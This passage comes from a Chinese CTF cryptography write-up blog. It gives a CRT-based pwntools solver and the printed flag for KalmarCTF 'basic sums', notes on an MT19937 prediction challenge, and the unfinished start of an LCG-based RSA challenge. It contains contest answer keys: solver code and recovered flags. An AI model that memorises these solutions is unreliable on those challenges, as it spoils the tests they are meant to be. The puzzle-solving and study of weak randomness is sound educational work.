<span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">base = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me a base! &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Base is too small&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"><span class="keyword">if</span> base &gt; <span class="number">256</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Base is too big&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Here you go! <span class="subst">&#123;<span class="built_in">sum</span>(numberToBase(flag, base))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>题目代码非常简单，我们会得到<strong>flag转换为n进制之后的数字之和</strong>，可以写成下面的形式</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>=</mo><msub><mi>a</mi><mi>n</mi></msub><msup><mi>b</mi><mi>n</mi></msup><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><msup><mi>b</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><msup><mi>b</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msup><mi>b</mi><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">flag=a_{n}b^{n}+a_{n-1}b^{n-1}+a_{n-2}b^{n-2}+...+a_{0}b^{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0224389999999999em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0224389999999999em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>同时，不难看出有</mtext></mrow><annotation encoding="application/x-tex">同时，不难看出有</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">难</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">有</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>≡</mo><mi>s</mi><mi>u</mi><mi>m</mi><mi>s</mi><mo>≡</mo><msub><mi>a</mi><mi>n</mi></msub><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>b</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">flag\equiv sums\equiv a_{n}+a_{n-1}+a_{n-2}+...+a_{1}+a_{1}(mod\ b-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><br /><img src="https://pic1.zhimg.com/80/v2-e37944dd5555d6ecc347a59f817263ba_1440w.png" alt="" /><br />上面是我们选择的进制之间的<strong>最小公倍数</strong>，下面是<strong>flag的近似大小(肯定要比这个大)</strong></p><p>所以，当<strong>模数足够大</strong>的时候，<code>flag</code>模它才能得到本身，同时我们也有</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>≡</mo><mi>s</mi><mi>u</mi><mi>m</mi><mi>s</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>b</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">flag\equiv sums\ mod\ (b-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>≡</mo><mi>m</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>l</mi><mi>c</mi><mi>m</mi><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>b</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">flag\equiv m\ mod\ lcm(n,b-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">c</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>在b不断增大的情况下，<strong>对m不断地进行crt结果的合并</strong>，当最小公倍数增大到<strong>模数大于flag的值</strong>时，我们才能获取到<strong>flag的唯一解</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>=</mo><mi>c</mi><mi>r</mi><mi>t</mi><mo stretchy="false">(</mo><mo stretchy="false">[</mo><mi>m</mi><mo separator="true">,</mo><mi>s</mi><mi>u</mi><mi>m</mi><mi>s</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mo stretchy="false">[</mo><mi>l</mi><mi>c</mi><mi>m</mi><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>b</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>b</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">flag=crt([m,sums],[lcm(n,b-1),b-1])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mopen">[</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">c</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">m = <span class="number">0</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>,<span class="number">256</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;basic-sums.chal-kalmarc.tf&#x27;</span>, <span class="number">2256</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Give me a base! &#x27;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;go! &#x27;</span>)</span><br><span class="line">    m0 = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">    n0 = i-<span class="number">1</span></span><br><span class="line">    m = crt([m,m0],[n,n0])</span><br><span class="line">    n = lcm(n,n0)</span><br><span class="line">    p.close()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;kalmar&#123;At_least_it_wasnt_lattices_right???!?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-2f0a7e2ca653e85402ba8c351ccf9640_1440w.png" alt="" /><br />这图片起到了一定的迷惑作用，我还以为要构造格才做的出来，我寻思着我这格构造的好像也不怎么行啊，而且这么多组数据，要怎么整呢，然后就看到<strong>春哥</strong>做出来了，牛批！！！</p><p>所以上面其实是我看了春哥写的文档之后，思考了一番(过程应该没问题)，觉得挺有意思的记录一下OvO</p><h1 id="tpctf2025-randomized-random"><a class="markdownIt-Anchor" href="#tpctf2025-randomized-random"></a> TPCTF2025 - randomized random</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FROM python:3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag=f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">64</span>):</span><br><span class="line">    <span class="built_in">print</span>(random.getrandbits(<span class="number">32</span>)+flag[random.getrandbits(<span class="number">32</span>)%<span class="built_in">len</span>(flag)])</span><br><span class="line">    <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>看到<code>getrandbits</code>，可以立马想到<code>MT19937</code>，这里的话因为两个随机数“加”起来了，我们不好处理，但是可以看做是我们可以得到不连续的随机数中的高24位，但看了师傅们的wp都说了实际测试发现影响到了低20位，所以取得是高12位</p><p>然后就是<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">不连续的MT19937</a></p><p>待我有空再钻研钻研</p><h1 id="2024第四届长城杯-randomrsa未完待续"><a class="markdownIt-Anchor" href="#2024第四届长城杯-randomrsa未完待续"></a> 2024第四届长城杯 - RandomRSA(未完待续)</h1><blockquote><p>题目描述：A特工从敌方服务器获取到了一份带有hint的机密文件，请协助破解加密。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, p, a, b</span>):</span><br><span class="line">        self.p = p</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.x = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(self.p, self.a, self.b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.x = (self.a*self.x+self.b) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPrimes</span>(<span class="params">bits, k</span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    a = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">    b = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">    l = LCG(p, a, b)</span><br><span class="line">    <span class="keyword">return</span> [gmpy2.next_prime(l.<span class="built_in">next</span>()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = getPrimes(<span class="number">1024</span>, <span class="number">2</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n, c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 170302223332374952785269454020752010235000449292324018706323228421794605831609342383813680059406887437726391567716617403068082252456126724116360291722050578106527815908837796377811535800753042840119867579793401648981916062128752925574017615120362457848369672169913701701169754804744410516724429370808383640129</span></span><br><span class="line"><span class="string">a = 95647398016998994323232737206171888899957187357027939982909965407086383339418183844601496450055752805846840966207033179756334909869395071918100649183599056695688702272113280126999439574017728476367307673524762493771576155949866442317616306832252931038932232342396406623324967479959770751756551238647385191314</span></span><br><span class="line"><span class="string">b = 122891504335833588148026640678812283515533067572514249355105863367413556242876686249628488512479399795117688641973272470884323873621143234628351006002398994272892177228185516130875243250912554684234982558913267007466946601210297176541861279902930860851219732696973412096603548467720104727887907369470758901838</span></span><br><span class="line"><span class="string">n = 5593134172275186875590245131682192688778392004699750710462210806902340747682378400226605648011816039948262008066066650657006955703136928662067931212033472838067050429624395919771757949640517085036958623280188133965150285410609475158882527926240531113060812228408346482328419754802280082212250908375099979058307437751229421708615341486221424596128137575042934928922615832987202762651904056934292682021963290271144473446994958975487980146329697970484311863524622696562094720833240915154181032649358743041246023013296745195478603299127094103448698060367648192905729866897074234681844252549934531893172709301411995941527</span></span><br><span class="line"><span class="string">c = 2185680728108057860427602387168654320024588536620246138642042133525937248576850574716324994222027251548743663286125769988360677327713281974075574656905916643746842819251899233266706138267250441832133068661277187507427787343897863339824140927640373352305007520681800240743854093190786046280731148485148774188448658663250731076739737801267702682463265663725900621375689684459894544169879873344003810307496162858318574830487480360419897453892053456993436452783099460908947258094434884954726862549670168954554640433833484822078996925040310316609425805351183165668893199137911145057639657709936762866208635582348932189646</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>≡</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">x\equiv ax+b\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>≡</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>k</mi><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">p&#x27;\equiv(x+k1)\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord 